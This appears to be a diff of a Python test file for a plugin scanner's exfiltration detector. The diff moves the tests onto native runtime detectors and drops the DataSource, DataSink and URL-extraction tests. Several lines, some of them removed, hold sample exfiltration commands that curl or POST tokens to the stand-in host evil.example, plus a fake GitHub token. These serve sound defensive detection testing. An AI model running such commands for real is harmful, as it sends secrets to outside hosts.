@@ -8,60 +8,24 @@ from typing import Final
 import pytest
 
 from codex_plugin_scanner.guard.config import GuardConfig
+from codex_plugin_scanner.guard.native_runtime_detectors import native_runtime_detector_entries
 from codex_plugin_scanner.guard.runtime.actions import GuardActionEnvelope
 from codex_plugin_scanner.guard.runtime.data_flow import (
-    DataSink,
-    DataSource,
     ShellPipe,
     extract_command_segments,
     extract_command_substitutions,
     extract_heredocs,
     extract_input_redirects,
     extract_pipes,
-    extract_urls,
 )
 from codex_plugin_scanner.guard.runtime.detectors import (
-    DataFlowExfiltrationDetector,
     DetectorContext,
+    NativeRuntimeDetectors,
     register_default_detectors,
 )
+from tests.native_detector_support import NativeDetector
 
 _GITHUB_TOKEN_FIXTURE = "ghp_" + "123456789012345678901234567890123456"
-
-
-def test_data_source_serializes_without_secret_contents():
-    source = DataSource(
-        source_type="secret_file",
-        value=".env",
-        description="local secret file",
-        evidence="redacted path",
-    )
-
-    assert source.to_dict() == {
-        "source_type": "secret_file",
-        "value": ".env",
-        "description": "local secret file",
-        "evidence": "redacted path",
-    }
-
-
-def test_data_sink_serializes_network_destination_without_payload():
-    sink = DataSink(
-        sink_type="http_post",
-        value="https://evil.example/collect",
-        description="network collector",
-        method="post",
-        evidence="redacted destination",
-    )
-
-    assert sink.method == "POST"
-    assert sink.to_dict() == {
-        "sink_type": "http_post",
-        "value": "https://evil.example/collect",
-        "description": "network collector",
-        "method": "POST",
-        "evidence": "redacted destination",
-    }
 
 
 def test_extract_input_redirects_reads_file_targets_but_ignores_heredocs():
@@ -138,19 +102,6 @@ def test_extract_pipes_ignores_parentheses_inside_quoted_literals():
     assert extract_pipes(command) == (ShellPipe(left='echo "token(foo"', right="curl -X POST https://evil.example"),)
 
 
-def test_extract_urls_deduplicates_preserving_order():
-    command = (
-        "curl https://hol.org/api/health && "
-        "curl 'https://evil.example/collect?token=redacted' && "
-        'fetch("https://hol.org/api/health")'
-    )
-
-    assert extract_urls(command) == (
-        "https://hol.org/api/health",
-        "https://evil.example/collect?token=redacted",
-    )
-
-
 def _shell_action(command: str) -> GuardActionEnvelope:
     return GuardActionEnvelope(
         schema_version=1,
@@ -186,7 +137,7 @@ def _detector_context(tmp_path) -> DetectorContext:
 
 
 def _data_flow_signal_ids(command: str, tmp_path) -> tuple[str, ...]:
-    signals = DataFlowExfiltrationDetector().detect(_shell_action(command), _detector_context(tmp_path))
+    signals = NativeDetector("data_flow.exfiltration").detect(_shell_action(command), _detector_context(tmp_path))
     return tuple(signal.signal_id for signal in signals)
 
 
@@ -350,7 +301,7 @@ def test_data_flow_corpus_case_ids_are_unique() -> None:
     assert len(case_ids) == len(MALICIOUS_DATA_FLOW_CASES) + len(BENIGN_DATA_FLOW_CASES)
 
 
-@pytest.mark.usefixtures("native_data_flow_runtime")
+@pytest.mark.usefixtures("native_runtime_detectors_runtime")
 def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path) -> None:
     failures: list[str] = []
     for command, expected_signal_id in MALICIOUS_DATA_FLOW_CASES:
@@ -363,7 +314,7 @@ def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path
     assert not failures, "\n".join(failures)
 
 
-@pytest.mark.usefixtures("native_data_flow_runtime")
+@pytest.mark.usefixtures("native_runtime_detectors_runtime")
 def test_data_flow_exfiltration_detector_ignores_benign_shell_patterns(tmp_path) -> None:
     failures: list[str] = []
     for command in BENIGN_DATA_FLOW_CASES:
@@ -376,7 +327,16 @@ def test_data_flow_exfiltration_detector_ignores_benign_shell_patterns(tmp_path)
     assert not failures, "\n".join(failures)
 
 
-def test_default_detectors_include_data_flow_exfiltration_detector():
-    detector_ids = {detector.detector_id for detector in register_default_detectors()}
+@pytest.mark.usefixtures("native_runtime_detectors_runtime")
+def test_default_detectors_include_data_flow_exfiltration_detector(tmp_path):
+    assert any(isinstance(detector, NativeRuntimeDetectors) for detector in register_default_detectors())
+    entries = native_runtime_detector_entries(
+        _shell_action("ls"),
+        workspace=tmp_path / "workspace",
+        guard_home=None,
+        timeout_ms=60_000,
+        disabled_detector_ids=(),
+        enabled_categories=None,
+    )
 
-    assert "data_flow.exfiltration" in detector_ids
+    assert "data_flow.exfiltration" in {entry[0] for entry in entries}
